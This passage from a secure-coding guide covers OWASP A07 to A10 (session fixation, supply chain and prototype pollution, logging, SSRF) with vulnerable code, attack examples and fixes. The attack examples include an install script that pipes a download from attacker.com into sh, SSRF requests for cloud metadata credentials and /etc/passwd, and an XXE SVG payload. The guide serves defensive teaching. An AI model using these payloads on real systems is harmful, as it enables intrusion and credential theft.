# Set-Cookie: sessionId=abc123

# 2. Attacker tricks victim to use this session ID
# Send link: https://app.quetrex.com/login?sessionId=abc123

# 3. Victim logs in with sessionId=abc123

# 4. Attacker uses sessionId=abc123 (now authenticated as victim!)
curl -b "sessionId=abc123" https://app.quetrex.com/api/user/data
```

**Secure Code:**
```typescript
// ✅ Regenerate session ID after login
export async function login(request: Request, email: string, password: string) {
  const user = await validateCredentials(email, password)

  // ✅ Delete old session
  const oldSessionId = request.cookies.get('sessionId')?.value
  if (oldSessionId) {
    await db.session.delete({ where: { id: oldSessionId } }).catch(() => {})
  }

  // ✅ Create NEW session ID
  const newSessionId = generateSessionId()

  await db.session.create({
    data: {
      id: newSessionId,
      userId: user.id,
      expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000),  // 24 hours
    },
  })

  // ✅ Set secure cookie
  const response = Response.json({ success: true })
  response.headers.set(
    'Set-Cookie',
    `sessionId=${newSessionId}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400`
  )

  return response
}

function generateSessionId(): string {
  return crypto.randomBytes(32).toString('hex')
}
```

---

## A08: Software and Data Integrity Failures

**Impact:** Supply chain attacks, unauthorized code execution, data corruption

### 1. Unverified Package Installation

**Vulnerable Code:**
```bash
# ❌ Install packages without verification
npm install some-package

# ❌ Using npm scripts from untrusted packages
npm install sketchy-tool && npm run sketchy-tool:install
```

**Attack:**
```json
// Malicious package.json
{
  "name": "sketchy-tool",
  "version": "1.0.0",
  "scripts": {
    "install": "curl https://attacker.com/malware.sh | sh"
  }
}
```

**Secure Code:**
```bash
# ✅ Use package-lock.json (committed to git)
npm ci  # Install from lock file (reproducible builds)

# ✅ Verify package integrity
npm install --ignore-scripts  # Disable install scripts

# ✅ Audit before installing new packages
npm view package-name
npm audit

# ✅ Use npm audit signatures (npm 9.7.0+)
npm audit signatures

# ✅ Verify package publisher
npm view package-name dist.shasum
npm view package-name maintainers
```

**package.json configuration:**
```json
{
  "scripts": {
    "preinstall": "npx only-allow npm",  // ✅ Enforce npm (not yarn/pnpm)
    "prepare": "npm run build"  // ✅ Safe script
  },
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  }
}
```

### 2. Insecure Deserialization

**Vulnerable Code:**
```typescript
// ❌ Deserialize untrusted data
export async function POST(request: Request) {
  const data = await request.json()

  // ❌ Directly use deserialized object
  const user = await db.user.create({ data })

  return Response.json(user)
}
```

**Attack:**
```javascript
// Attacker sends:
{
  "email": "attacker@example.com",
  "password": "password123",
  "role": "ADMIN",  // ❌ Privilege escalation!
  "__proto__": { "isAdmin": true }  // ❌ Prototype pollution!
}
```

**Secure Code:**
```typescript
import { z } from 'zod'

// ✅ Define strict schema
const createUserSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8),
  name: z.string().optional(),
  // role NOT allowed in user input
})

export async function POST(request: Request) {
  const body = await request.json()

  // ✅ Validate against schema (removes extra fields)
  const validated = createUserSchema.parse(body)

  // ✅ Set role server-side
  const user = await db.user.create({
    data: {
      ...validated,
      role: 'USER',  // Always USER for registration
    },
  })

  return Response.json(user)
}

// ✅ Prevent prototype pollution
function isPlainObject(obj: unknown): boolean {
  return (
    typeof obj === 'object' &&
    obj !== null &&
    Object.getPrototypeOf(obj) === Object.prototype
  )
}

function sanitizeObject(obj: any): any {
  if (!isPlainObject(obj)) {
    return obj
  }

  const sanitized: any = {}

  for (const key of Object.keys(obj)) {
    // ✅ Reject __proto__, constructor, prototype
    if (['__proto__', 'constructor', 'prototype'].includes(key)) {
      continue
    }

    sanitized[key] = sanitizeObject(obj[key])
  }

  return sanitized
}
```

---

## A09: Security Logging and Monitoring Failures

**Impact:** Undetected breaches, slow incident response, compliance violations

### Missing Critical Logging

**Vulnerable Code:**
```typescript
// ❌ No logging
export async function POST(request: Request) {
  const user = await db.user.create({ data })
  return Response.json(user)
}

// ❌ Console.log (not persistent, not structured)
console.log('User logged in:', user.email)
```

**Secure Code:**
```typescript
import { logger } from '@/lib/logger'

// ✅ Structured logging with context
export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for') ||
             request.headers.get('x-real-ip')
  const userAgent = request.headers.get('user-agent')

  try {
    const user = await db.user.create({ data })

    // ✅ Log success with context
    logger.info('User created', {
      userId: user.id,
      email: user.email,
      ip,
      userAgent,
      timestamp: new Date().toISOString(),
      action: 'USER_REGISTRATION',
    })

    return Response.json(user)
  } catch (error) {
    // ✅ Log error with context
    logger.error('User creation failed', {
      error: error instanceof Error ? error.message : 'Unknown error',
      stack: error instanceof Error ? error.stack : undefined,
      email: data.email,
      ip,
      userAgent,
      timestamp: new Date().toISOString(),
      action: 'USER_REGISTRATION_FAILED',
    })

    throw error
  }
}

// ✅ Log authentication attempts
export async function login(email: string, password: string, ip: string) {
  const user = await db.user.findUnique({ where: { email } })

  if (!user) {
    // ✅ Log failed attempt
    logger.warn('Login failed: user not found', {
      email,
      ip,
      timestamp: new Date().toISOString(),
      action: 'LOGIN_FAILED',
      reason: 'USER_NOT_FOUND',
    })

    throw new Error('Invalid credentials')
  }

  const valid = await bcrypt.compare(password, user.password)

  if (!valid) {
    // ✅ Log failed attempt
    logger.warn('Login failed: invalid password', {
      userId: user.id,
      email,
      ip,
      timestamp: new Date().toISOString(),
      action: 'LOGIN_FAILED',
      reason: 'INVALID_PASSWORD',
    })

    // ✅ Track failed attempts
    await db.loginAttempt.create({
      data: {
        userId: user.id,
        ip,
        success: false,
        timestamp: new Date(),
      },
    })

    throw new Error('Invalid credentials')
  }

  // ✅ Log successful login
  logger.info('Login successful', {
    userId: user.id,
    email,
    ip,
    timestamp: new Date().toISOString(),
    action: 'LOGIN_SUCCESS',
  })

  await db.loginAttempt.create({
    data: {
      userId: user.id,
      ip,
      success: true,
      timestamp: new Date(),
    },
  })

  return user
}

// ✅ Log privilege escalation attempts
export async function updateUserRole(adminId: string, targetUserId: string, newRole: string) {
  logger.warn('Role change attempted', {
    adminId,
    targetUserId,
    newRole,
    timestamp: new Date().toISOString(),
    action: 'ROLE_CHANGE_ATTEMPT',
  })

  const admin = await db.user.findUnique({ where: { id: adminId } })

  if (admin.role !== 'ADMIN') {
    logger.error('Unauthorized role change attempt', {
      adminId,
      targetUserId,
      newRole,
      adminRole: admin.role,
      timestamp: new Date().toISOString(),
      action: 'UNAUTHORIZED_ROLE_CHANGE',
    })

    throw new Error('Forbidden')
  }

  await db.user.update({
    where: { id: targetUserId },
    data: { role: newRole },
  })

  logger.info('Role changed successfully', {
    adminId,
    targetUserId,
    newRole,
    timestamp: new Date().toISOString(),
    action: 'ROLE_CHANGED',
  })
}
```

**Logger Implementation:**
```typescript
// src/lib/logger.ts
import winston from 'winston'

export const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  transports: [
    // ✅ File transport (persistent)
    new winston.transports.File({
      filename: 'logs/error.log',
      level: 'error',
      maxsize: 10485760,  // 10MB
      maxFiles: 10,
    }),
    new winston.transports.File({
      filename: 'logs/combined.log',
      maxsize: 10485760,
      maxFiles: 10,
    }),
  ],
})

// ✅ Console transport for development
if (process.env.NODE_ENV === 'development') {
  logger.add(new winston.transports.Console({
    format: winston.format.combine(
      winston.format.colorize(),
      winston.format.simple()
    ),
  }))
}

// ✅ Events to ALWAYS log
// 1. Authentication events (login, logout, failed attempts)
// 2. Authorization failures (403 responses)
// 3. Input validation failures (suspicious input)
// 4. Administrative actions (role changes, user deletion)
// 5. Security configuration changes
// 6. Application errors (500 responses)
```

---

## A10: Server-Side Request Forgery (SSRF)

**Impact:** Internal network access, cloud metadata access, data exfiltration

### 1. Unvalidated URL Fetching

**Vulnerable Code:**
```typescript
// ❌ Fetch user-provided URL
export async function POST(request: Request) {
  const { url } = await request.json()

  // ❌ No validation - attacker can access internal services!
  const response = await fetch(url)
  const data = await response.text()

  return Response.json({ data })
}
```

**Attack:**
```bash
# Access internal services
curl -X POST https://api.example.com/api/fetch \
  -d '{"url":"http://localhost:5432/admin"}'

# Access cloud metadata (AWS, GCP, Azure)
curl -X POST https://api.example.com/api/fetch \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Returns AWS credentials!

# Port scanning
curl -X POST https://api.example.com/api/fetch \
  -d '{"url":"http://10.0.0.1:22"}'  # Check if SSH port open

# Access local files (if file:// not blocked)
curl -X POST https://api.example.com/api/fetch \
  -d '{"url":"file:///etc/passwd"}'
```

**Secure Code:**
```typescript
import { z } from 'zod'

// ✅ Whitelist allowed domains
const ALLOWED_DOMAINS = [
  'api.github.com',
  'api.openai.com',
  'api.stripe.com',
]

// ✅ Blocked IP ranges (RFC1918 private networks + cloud metadata)
const BLOCKED_IP_RANGES = [
  '10.0.0.0/8',
  '172.16.0.0/12',
  '192.168.0.0/16',
  '127.0.0.0/8',
  '169.254.0.0/16',  // AWS/GCP metadata
  '::1/128',  // IPv6 localhost
  'fc00::/7',  // IPv6 private
]

// ✅ URL validation schema
const urlSchema = z.string().url().refine(
  (url) => {
    const parsed = new URL(url)

    // Only allow HTTPS
    if (parsed.protocol !== 'https:') {
      return false
    }

    // Check whitelist
    if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
      return false
    }

    return true
  },
  { message: 'URL not allowed' }
)

export async function POST(request: Request) {
  const { url } = await request.json()

  // ✅ Validate URL
  const validatedUrl = urlSchema.parse(url)

  // ✅ Resolve hostname to IP (prevent DNS rebinding)
  const parsed = new URL(validatedUrl)
  const { address } = await dns.promises.lookup(parsed.hostname)

  // ✅ Check if IP is blocked
  if (isBlockedIP(address)) {
    throw new Error('Access to this IP address is not allowed')
  }

  // ✅ Fetch with timeout and size limit
  const controller = new AbortController()
  const timeout = setTimeout(() => controller.abort(), 5000)  // 5 second timeout

  try {
    const response = await fetch(validatedUrl, {
      signal: controller.signal,
      redirect: 'manual',  // Don't follow redirects
      headers: {
        'User-Agent': 'Quetrex/1.0',
      },
    })

    // ✅ Limit response size
    const MAX_SIZE = 1024 * 1024  // 1MB
    const reader = response.body?.getReader()
    const chunks: Uint8Array[] = []
    let totalSize = 0

    if (reader) {
      while (true) {
        const { done, value } = await reader.read()
        if (done) break

        totalSize += value.length
        if (totalSize > MAX_SIZE) {
          throw new Error('Response too large')
        }

        chunks.push(value)
      }
    }

    const data = Buffer.concat(chunks).toString('utf-8')

    return Response.json({ data })
  } finally {
    clearTimeout(timeout)
  }
}

function isBlockedIP(ip: string): boolean {
  // Check against blocked IP ranges
  for (const range of BLOCKED_IP_RANGES) {
    if (ipInRange(ip, range)) {
      return true
    }
  }

  return false
}

function ipInRange(ip: string, range: string): boolean {
  const [rangeIP, rangeCIDR] = range.split('/')
  const mask = parseInt(rangeCIDR, 10)

  const ipNum = ipToNumber(ip)
  const rangeNum = ipToNumber(rangeIP)
  const maskNum = (0xFFFFFFFF << (32 - mask)) >>> 0

  return (ipNum & maskNum) === (rangeNum & maskNum)
}

function ipToNumber(ip: string): number {
  return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0
}
```

### 2. SSRF via File Upload

**Vulnerable Code:**
```typescript
// ❌ Process SVG with external entities
export async function POST(request: Request) {
  const formData = await request.formData()
  const file = formData.get('file') as File

  // ❌ No validation - SVG can contain XXE/SSRF
  const content = await file.text()

  return Response.json({ content })
}
```

**Attack:**
```xml
<!-- Malicious SVG file -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>  <!-- Fetches AWS credentials -->
</svg>
```

**Secure Code:**
```typescript
import sharp from 'sharp'
import { z } from 'zod'

const ALLOWED_MIME_TYPES = ['image/png', 'image/jpeg', 'image/webp']
const MAX_FILE_SIZE = 5 * 1024 * 1024  // 5MB

export async function POST(request: Request) {
  const formData = await request.formData()
  const file = formData.get('file') as File

  // ✅ Validate file type
  if (!ALLOWED_MIME_TYPES.includes(file.type)) {
    throw new Error('Invalid file type')
  }

  // ✅ Validate file size
  if (file.size > MAX_FILE_SIZE) {
    throw new Error('File too large')
  }

  const buffer = Buffer.from(await file.arrayBuffer())

  try {
    // ✅ Process with sharp (sanitizes image, removes metadata/scripts)
    const processed = await sharp(buffer)
      .resize(1000, 1000, { fit: 'inside', withoutEnlargement: true })
      .removeAlpha()  // Remove alpha channel
      .jpeg({ quality: 80 })  // Convert to JPEG (no external entities)
      .toBuffer()

    // ✅ Save processed image
    const filename = `${crypto.randomUUID()}.jpg`
    await saveFile(filename, processed)

    return Response.json({ filename })
  } catch (error) {
    // ✅ sharp will throw on invalid/malicious images
    throw new Error('Invalid image file')
  }
}
```

---

## Summary Checklist

**Before deploying ANY code, verify:**

- [ ] **A01 Broken Access Control**
  - [ ] Authorization checks on ALL protected routes
  - [ ] No IDOR vulnerabilities (verify ownership)
  - [ ] No path traversal (validate and sanitize paths)

- [ ] **A02 Cryptographic Failures**
  - [ ] Passwords hashed with bcrypt (12+ rounds) or Argon2
  - [ ] No hardcoded secrets (use environment variables)
  - [ ] Strong encryption (AES-256-GCM, not ECB)

- [ ] **A03 Injection**
  - [ ] All SQL queries parameterized (Drizzle ORM)
  - [ ] No eval() or Function() with user input
  - [ ] Shell commands use spawn with array arguments

- [ ] **A04 Insecure Design**
  - [ ] Rate limiting on authentication endpoints
  - [ ] Atomic transactions for critical operations
  - [ ] No race conditions

- [ ] **A05 Security Misconfiguration**
  - [ ] Generic error messages in production
  - [ ] CORS whitelist (not *)
  - [ ] Security headers set correctly

- [ ] **A06 Vulnerable Components**
  - [ ] npm audit passes
  - [ ] Dependencies up to date
  - [ ] No known CVEs

- [ ] **A07 Authentication Failures**
  - [ ] Strong password policy (8+ chars, complexity)
  - [ ] MFA available for sensitive accounts
  - [ ] Session regeneration after login

- [ ] **A08 Integrity Failures**
  - [ ] Package integrity verified (package-lock.json)
  - [ ] Input validation with Zod
  - [ ] No prototype pollution

- [ ] **A09 Logging Failures**
  - [ ] Authentication events logged
  - [ ] Authorization failures logged
  - [ ] Admin actions logged

- [ ] **A10 SSRF**
  - [ ] URL whitelist (not blacklist)
  - [ ] Blocked IP ranges (private networks, metadata)
  - [ ] File uploads sanitized

---

**References:**
- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org/
- CWE Top 25: https://cwe.mitre.org/top25/
